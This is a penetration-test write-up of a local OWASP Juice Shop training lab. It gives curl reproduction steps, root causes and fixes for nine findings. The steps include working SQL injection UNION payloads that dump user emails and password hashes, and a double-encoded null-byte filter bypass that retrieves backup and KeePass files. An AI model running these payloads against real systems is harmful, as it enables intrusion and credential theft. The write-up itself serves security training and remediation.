# [MULTI] OWASP Juice Shop — Full Reconnaissance to Exploitation

**Target:** OWASP Juice Shop v6.2.0-SNAPSHOT (local instance — training lab)
**Date:** 9 October 2026
**Researcher:** Twist
**Severity summary:** 1 Critical · 3 High · 3 Medium · 2 Low

---

## 📋 FINDING INDEX

| # | Finding | Severity |
|---|---|---|
| 1 | SQL Injection → full database compromise | CRITICAL |
| 2 | Directory listing + 12 sensitive files exposed | HIGH |
| 3 | File extension filter bypass via null byte | HIGH |
| 4 | Sensitive data in publicly readable APIs | HIGH |
| 5 | Missing security headers (CSP, HSTS) | MEDIUM |
| 6 | Wildcard CORS policy (`Access-Control-Allow-Origin: *`) | MEDIUM |
| 7 | Prometheus metrics endpoint exposed unauthenticated | MEDIUM |
| 8 | Outdated dependencies with known CVEs | LOW |
| 9 | SPA catch-all masking real 404s | LOW |

---

## 1. SQL Injection → Full Database Compromise  [CRITICAL]

**Endpoint:** `GET /rest/products/search?q=`

### Reproduction

```bash
# confirm
curl -sS "http://localhost:3000/rest/products/search?q=apple'"
# → SQLITE_ERROR: near "'": syntax error

# defeat the query
curl -sS "http://localhost:3000/rest/products/search?q=apple'))--"
# → 0 results, no error

# 9 columns
curl -sS "http://localhost:3000/rest/products/search?q=apple')) ORDER BY 9--"

# enumerate schema
curl -sS "http://localhost:3000/rest/products/search?q=x')) UNION SELECT 1,name,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--"

# dump accounts
curl -sS "http://localhost:3000/rest/products/search?q=x')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--"
```

**Result:** 20 tables, 24 accounts with MD5 hashes, administrator takeover.

*Full write-up: see write-up 001.*

---

## 2. Directory Listing + 12 Sensitive Files Exposed  [HIGH]

**Endpoint:** `GET /ftp/`

The `/ftp` directory has `serve-index` enabled. Directory listing is on and no
authentication is required. Twelve files are exposed — several of which were
clearly never meant to be public.

### Reproduction

```bash
curl -sS http://localhost:3000/ftp/
```

### Exposed files

| File | Why it matters |
|---|---|
| `acquisitions.md` | Internal confidential business document |
| `incident-support.kdbx` | KeePass password database |
| `encrypt.pyc` | Encryption script — leaks the algorithm |
| `package-lock.json.bak` | 771 KB / 1,968 dependency pins |
| `package.json.bak` | Exact app version + vulnerable dependency list |
| `coupons_2013.md.bak` | Encrypted coupon file |
| `suspicious_errors.yml` | Internal error-tracking rules |
| `announcement_encrypted.md` | 369 KB of RSA-encrypted confidential text |
| + 4 more | misc. backups |

### Evidence — contents of `acquisitions.md`

```markdown
# Planned Acquisitions

This document is confidential! Do not distribute!

[...]
```

The file states its own confidentiality in the first line. It is served
publicly, unauthenticated, from a directory listing.

### Root cause

```javascript
// static file serving with directory listing enabled
app.use('/ftp', serveIndex('ftp', { icons: true }));
app.use('/ftp', express.static('ftp'));
```

`serveIndex` generates a browsable HTML index of the directory. Combined with
backup files left in the same folder, this is a direct path to sensitive data.

### Impact

The leaked `package.json.bak` reveals the exact application version and its
dependency tree. That alone hands an attacker a prioritised list of known CVEs
to try.

---

## 3. File Extension Filter Bypass via Null Byte  [HIGH]

A filter was added to block non-`.md`/`.pdf` downloads from `/ftp`. It is
bypassable.

### The filter

```bash
curl -sS "http://localhost:3000/ftp/package.json.bak"
```
```json
{"error":"Only .md and .pdf files are allowed!"}
```

### The bypass

```bash
curl -sS "http://localhost:3000/ftp/package.json.bak%2500.md"
```

**200 OK — file downloaded.**

### How it works

The filter decodes the filename **once** and checks the extension. The payload
is double-encoded:

```
%2500  --decode once-->  %00   ← filter sees this: literal "%00", looks harmless
          --decode twice-->  \0  ← filesystem sees this: null byte truncates the path
```

```
package.json.bak%2500.md
   │
   ├─ filter decodes once  → "package.json.bak%00.md"  → ends in ".md" → ALLOWED
   └─ server decodes again → "package.json.bak\0.md"   → null byte truncates
                                                        → serves "package.json.bak"
```

**Eleven other techniques were attempted and all failed** — only the double
URL-encoded null byte worked. This is worth recording: a filter that looks
robust defeated every ordinary bypass and fell to a single encoding depth
mismatch.

### Files recovered through this bypass

```
package.json.bak        ← version 6.2.0-SNAPSHOT, sanitize-html 1.4.2, jsonwebtoken ~8, Node >=6 <=9
package-lock.json.bak   ← 771 KB, 1,968 packages
encrypt.pyc             ← RSA encryption script (led to finding C in write-up 003)
coupons_2013.md.bak     ← XOR/ADD ciphertext
suspicious_errors.yml
incident-support.kdbx
```

### Root cause

Validation and use operate on **different decoded forms** of the same string.
The check happens after one decode; the filesystem call happens after another.

### Remediation

```javascript
// SAFE — normalise once, validate that exact value, use that exact value
const path = require('path');

app.get('/ftp/:file', (req, res) => {
  const name = path.basename(req.params.file);        // strip any traversal
  if (name.includes('\0')) return res.sendStatus(400); // reject null bytes
  const ext = path.extname(name).toLowerCase();
  if (!['.md', '.pdf'].includes(ext)) return res.sendStatus(403);
  res.sendFile(path.join(UPLOAD_DIR, name));           // use the SAME value
});
```

**Rule:** validate the value you are about to use. Never validate one
representation and act on another.

---

## 4. Sensitive Data in Publicly Readable APIs  [HIGH]

Several endpoints return data with no authentication requirement.

### Reproduction

```bash
curl -sS http://localhost:3000/rest/memories    | head -c 200
curl -sS http://localhost:3000/api/Feedbacks    | head -c 200
curl -sS http://localhost:3000/api/Challenges   | head -c 200
```

### Results

| Endpoint | Exposed | Records |
|---|---|---|
| `/rest/memories` | Photo captions + user associations | 10 |
| `/api/Feedbacks` | Feedback comments **including email addresses** | 8 |
| `/api/Challenges` | Every challenge name + hint text | 116 (66 KB) |
| `/metrics` | Prometheus metrics — internal counters, paths, timings | 379 lines |

`/api/Feedbacks` leaking user email addresses alongside their comments is the
most serious — that is PII exposure, not just information disclosure.

`/api/Challenges` returning all 116 challenges with hints is equivalent to
publishing the answer key: every vulnerability in the application, enumerated.

---

## 5. Missing Security Headers  [MEDIUM]

### Reproduction

```bash
curl -sSI http://localhost:3000/ | grep -iE "content-security|strict-transport|x-frame|x-content"
```

### Result

```
(none of these headers present)
```

| Header | Status | Consequence |
|---|---|---|
| `Content-Security-Policy` | missing | No mitigation layer against XSS |
| `Strict-Transport-Security` | missing | Allows protocol downgrade / stripping |
| `X-Content-Type-Options` | missing | MIME-type sniffing permitted |
| `X-Frame-Options` | missing | Clickjacking possible |

The missing CSP is directly relevant — the DOM XSS documented in write-up 004
would have been blocked outright by a strict `script-src 'self'` policy.

### Remediation

```javascript
const helmet = require('helmet');
app.use(helmet());                       // sets all four headers by default
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc:  ["'self'"],              // blocks inline XSS execution
    objectSrc:  ["'none'"],
    frameAncestors: ["'none'"],
  },
}));
```

---

## 6. Wildcard CORS Policy  [MEDIUM]

### Reproduction

```bash
curl -sSI http://localhost:3000/ -H "Origin: https://evil.example" | grep -i access-control
```

### Result

```
Access-Control-Allow-Origin: *
```

Any origin can read responses from this API. Combined with cookie-based
sessions, this enables cross-origin data theft from any malicious page a user
visits.

### Remediation

```javascript
// SAFE — allow-list instead of wildcard
const ALLOWED = ['https://app.example.com'];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Vary', 'Origin');
  }
  next();
});
```

Never combine `Access-Control-Allow-Origin: *` with
`Access-Control-Allow-Credentials: true`.

---

## 7. Prometheus Metrics Exposed Unauthenticated  [MEDIUM]

### Reproduction

```bash
curl -sS http://localhost:3000/metrics | head -30
```

### Result

379 lines of Prometheus metrics, publicly readable: internal route names, HTTP
status distributions, request timings, process memory. Useful for mapping the
application's internals without touching the application itself.

### Remediation

```javascript
// bind metrics to localhost only, or gate behind auth
app.get('/metrics', authenticate(['monitoring']), metricsHandler);
```

---

## 8. Outdated Dependencies with Known CVEs  [LOW]

Source: the leaked `package.json.bak` (finding 2).

```
Application   : 6.2.0-SNAPSHOT
sanitize-html : 1.4.2          ← known XSS bypass vectors in this range
jsonwebtoken  : ~8             ← algorithm-confusion issues in older versions
Node engine   : >=6 <=9        ← end-of-life; no security patches
```

Applications running on end-of-life runtimes accumulate unpatched
vulnerabilities indefinitely. This is a supply-chain risk, not a single bug.

---

## 9. SPA Catch-All Masks Real 404s  [LOW]

Every unknown path returns HTTP 200 with the SPA's HTML — including paths that
should 404.

```bash
for p in /.git/config /package.json /sitemap.xml; do
  echo -n "$p → "
  curl -sS -o /dev/null -w "%{http_code} %{content_type}\n" "http://localhost:3000$p"
done
```
```
/.git/config   → 200 text/html
/package.json  → 200 text/html
/sitemap.xml   → 200 text/html
```

All three return the SPA shell. `/metrics` (text/plain) and `/ftp` (HTML
listing) were the only genuinely distinct responses.

### Why this matters for testing

**`200 OK` does not mean a file exists.** This produced false positives during
reconnaissance — probing for exposed files requires checking `Content-Type`,
not just the status code. A real `.git/config` would return `text/plain`; this
returns `text/html`.

---

## 🔧 Methodology

```
1. Fingerprint   → headers, tech stack, response shapes
2. Enumerate     → parse JS bundle for endpoints (15 /api/*, 21 /rest/*)
3. Probe         → unauthenticated access to every discovered endpoint
4. Verify        → confirm Content-Type before reporting a hit
5. Exploit       → injection, filter bypass, data extraction
6. Document      → reproduction steps + root cause + remediation
```

**Tools:** curl, Python (parsing/verification), manual analysis.
No Go/Docker-dependent toolchain — everything portable.

---

## 📝 Key Lessons

**1. Directory listings are the cheapest door in.**
Before any injection work, check for browsable directories and backup files.
Highest return per unit of effort.

**2. `200 OK` is not evidence.**
The SPA catch-all nearly produced false positives on `.git/config`,
`package.json`, and `sitemap.xml`. Always check `Content-Type`.

**3. Filters fail at encoding boundaries.**
The extension filter blocked eleven ordinary bypass techniques and fell to one
double-encoded null byte. When validating, normalise once and use exactly that
value.

**4. Verify the claim, not the assumption.**
Every finding here was confirmed with a second, independent request. A response
that *looks* like success is not success.
